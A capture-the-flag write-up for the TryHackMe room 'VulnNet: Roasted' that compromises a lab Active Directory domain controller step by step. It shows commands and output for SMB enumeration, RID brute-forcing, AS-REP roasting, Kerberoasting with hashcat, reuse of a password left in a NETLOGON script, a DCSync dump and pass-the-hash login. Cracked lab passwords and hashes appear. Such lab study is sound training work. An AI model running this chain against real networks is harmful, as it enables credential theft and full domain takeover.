---
tags:
  - THM
  - Windows
  - Easy
  - AD
  - Brute-Force
  - AS-REP
  - Kerberoasting
  - DCSync
  - PtH
---
https://tryhackme.com/room/vulnnetroasted/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.64.149.218 WIN-2BO8M1OE1M1 vulnnet-rst.local
```
# Scanning
The machine is a **Domain Controller (DC)**:
```console
$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49668,49669,49670,49677,49703,49806 -sV -sC vulnnet-rst.local

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-04 19:34:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49806/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-04T19:35:18
|_  start_date: N/A
```
# Enumeration
## Domain Users
User `guest` is allowed:
```console
$ nxc smb vulnnet-rst.local -u 'guest' -p '' --shares

SMB         10.64.149.218   445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.64.149.218   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\guest: 
SMB         10.64.149.218   445    WIN-2BO8M1OE1M1  [*] Enumerated shares
SMB         10.64.149.218   445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.64.149.218   445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.64.149.218   445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.64.149.218   445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.64.149.218   445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.64.149.218   445    WIN-2BO8M1OE1M1  NETLOGON                        Logon server share 
SMB         10.64.149.218   445    WIN-2BO8M1OE1M1  SYSVOL                          Logon server share 
SMB         10.64.149.218   445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.64.149.218   445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing
```
Found some names and last names inside the `VulnNet-Business-Anonymous` and `VulnNet-Enterprise-Anonymous` shares, but there is really nothing interesting.

> Note: the target IP changed to `10.67.161.132` from now on.

Found **existing users** and saved them in `usernames.txt` by brute-forcing RIDs:
```console
$ lookupsid.py 'vulnnet-rst.local/guest@10.67.161.132' | awk '/SidTypeUser/ {print $2}' | awk -F '\' '{print $2}' | tee usernames.txt
Password:

Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```
Found user `t-skid` with **pre-authentication disabled** by AS-REP roasting:
```console
$ GetNPUsers.py -usersfile usernames.txt -no-pass -format hashcat -outputfile TGTs.hash vulnnet-rst.local/
...
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:27db1f096d58c588165025e7276a67e6$9263b2374262599aa8877d499197fd9ebe4d9b65dac474ea8a830c99845868c759456e2f1706be8748b504eed3e037c41bef6c26bf8cfeb5fc3bd21f1f5e26172e9f18c43aa0f354f28e6ed17ec8fb5d01e6d15ce55104af2b826bb7e3545a7ef4ff08a71b9b1765fd5efa2f5049250f9f564916e73c020315207e27dc1df2378425ef5679c459de0688241cf378f6bb2fb3d8e7d75f00c19517750803a731e9381058b82179a009c7a11d19445ba6807f5a3852f0a82590dddd60f131b950e03bd25f6cdb06eb2f4eb9ae5c8f38acf4e70d7e237c0a0bd5e90ab7856f66604e88e7e8173ce31226943a9906bfb8072269c9a5da984a
...
```
Get **credentials** for `t-skid`:
```console
$ hashcat -a 0 -m 18200 TGTs.hash /usr/share/wordlists/rockyou.txt
...
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:27db1f096d58c588165025e7276a67e6$9263b2374262599aa8877d499197fd9ebe4d9b65dac474ea8a830c99845868c759456e2f1706be8748b504eed3e037c41bef6c26bf8cfeb5fc3bd21f1f5e26172e9f18c43aa0f354f28e6ed17ec8fb5d01e6d15ce55104af2b826bb7e3545a7ef4ff08a71b9b1765fd5efa2f5049250f9f564916e73c020315207e27dc1df2378425ef5679c459de0688241cf378f6bb2fb3d8e7d75f00c19517750803a731e9381058b82179a009c7a11d19445ba6807f5a3852f0a82590dddd60f131b950e03bd25f6cdb06eb2f4eb9ae5c8f38acf4e70d7e237c0a0bd5e90ab7856f66604e88e7e8173ce31226943a9906bfb8072269c9a5da984a:tj072889*
...
```
## Domain Services
Now, execute a Kerberoasting attack by asking for Ticket Granting Service and crack it:
```console
$ GetUserSPNs.py -request -outputfile TGSs.hash 'vulnnet-rst.local/t-skid:tj072889*'

$ hashcat -a 0 -m 13100 TGSs.hash /usr/share/wordlists/rockyou.txt
...
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$97d87950f90cc2e692bd60d77a2caff2$3df3abae7ee0b694d32296bdbec312a7f1c6414b16fd51201ba51a3fbe294c057e8a72d236390711fc7131ebe22b6d9a59efa5a347d83a7e0e058df56c9355fb75e307f04d012c4b60781ac2feeedd72cfdd5343d24b8ae816688a65a8f0274887fd90d01936b44438be3fcc76d81c1460614f031f1e2e6f0ff4100e31d17e67e2b8dda0a75771bf4d6ad84f89f7cc3a13c5ecdf8a8e6e236a424b479e4d2964dfe709f2fc9420d572b7791998a5acccd10f68402c574fecabd9687cc31ec2640c0e40c9dd367fa2b945938dfa41ad57cca6d71a2f2765e661dbdeec1998c055c5911e2de384c1c822e7497eeb22a114b603a821ea16cc71cdcf7dd7410143b300ab6ebf0041e58f11964d02a8f4b57d384063947322b32d9cd6007cb58b94dce68b03fb307965b539838cf51da20debc57efa3b63c24f597dc2e743288a6332d3e4e152ea416726fab8d6e4c698c623955f75a9d698d3a39d28f7af953caf9ac43371143d40379451688a57441677ed5f9f66457c32bb79d0fb0764f269dc07b207d5155cb5d044471997fcfb38024dd96dadc3d913996e8265c068d1b33ac7ca76dedcfc3521c8c46e7be9a78d3afb8e4ccb00a748abd01359c9149ade54015f9672ca7d436d28706a8a52463039b8055d368fe0a23a5fc6495968b5c8d8b1675ff8b03db69ca79398b7cbc64c5617a05f86d0e8d203bfa995e55d4cf3c9744cd46a15a4f33c24f6001f115536507c17f696c4f2d66fa51483d0b53ae5674d31fb28934cb135f9a3af17c500f8bf3956c0feaee0a364b7227d1c797da2d2e687d2e9290da9630e21ef9d6beea97e0fb35d8fd4af1118c7714eb404a2d4047fe79079ea77effabcdbbf3053266df3e3bd7ea9e16bce1d03cabb56133294d188fcc17c76da50a6a0a8fbbf22343dfbc6b5e429f3199175de3b5ec6eba641c26ed8a5eac85062228bd148dceac3117db0a78f0be2d978fe693021d8409077c4dc4afa233529dd6e0ddbbff07d89f1f222226575cbbeb6acbf51357ee9683c38340d4120e172a7e0fcdb71e75917c6ef304ddfa1a06149a0456beed8f230f465f3d7fec1460ac9a675c9f906154e12fa1639639854aa0c33396f8c25a1588d7a43012592c00f9e64ad090f179533fa00bacd491cc43409f40939492293eef7107ec889e8ab7753a4804a6a3f2c1713d58cd15ae7e7931e419987c9b1a174f785b37cb365ab3fa4860c7293a9c341995a582b8564a86a946f9e8a1cf314df87c8ce380bc39805c7a44045b7dfae91d1fbc50296b11b75fb2eb77c8c1eee014ae6607abfce89c713d6c378c50db51eba2b9da489c486868ded862a191b0d39261b9a852c909098b1dffb77e6bdda8cf7ab83c101eb4eb4dae583e549bc9a65:ry=ibfkfv,s6h,
...
```
## Domain Admins
The service has **read permissions** to the `NETLOGON` share:
```console
$ nxc smb vulnnet-rst.local -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' --shares

SMB         10.67.161.132   445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.67.161.132   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\enterprise-core-vn:ry=ibfkfv,s6h, 
SMB         10.67.161.132   445    WIN-2BO8M1OE1M1  [*] Enumerated shares
SMB         10.67.161.132   445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.67.161.132   445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.67.161.132   445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.67.161.132   445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.67.161.132   445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.67.161.132   445    WIN-2BO8M1OE1M1  NETLOGON        READ            Logon server share 
SMB         10.67.161.132   445    WIN-2BO8M1OE1M1  SYSVOL          READ            Logon server share 
SMB         10.67.161.132   445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.67.161.132   445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing
```
Found some **credentials** inside the share:
```console
$ smbclient -U 'enterprise-core-vn' //10.67.161.132/NETLOGON
Password for [WORKGROUP\enterprise-core-vn]:

smb: \> ls
  .                                   D        0  Tue Mar 16 17:15:49 2021
  ..                                  D        0  Tue Mar 16 17:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 17:18:14 2021

		8771839 blocks of size 4096. 4501815 blocks available
smb: \> get ResetPassword.vbs 
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (2.6 KiloBytes/sec) (average 2.6 KiloBytes/sec)
smb: \> quit

$ cat ResetPassword.vbs
...
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
...
```
The user `a-whitehat` is a **domain admin**:
```console
$ nxc smb vulnnet-rst.local -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'

SMB         10.67.161.132   445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.67.161.132   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
```
# Exploitation
Perform a DCSync attack to get all the **domain hashes**:
```console
$ secretsdump.py -outputfile secrets vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.67.161.132

$ cat secrets.sam
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
Connect via **winrm** as **Administrator** using pass-the-hash:
```console
$ evil-winrm -i 10.67.161.132 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
```
Get **both flags**:
```console
PS> type C:\Users\enterprise-core-vn\Desktop\user.txt

PS> type C:\Users\Administrator\Desktop\system.txt
```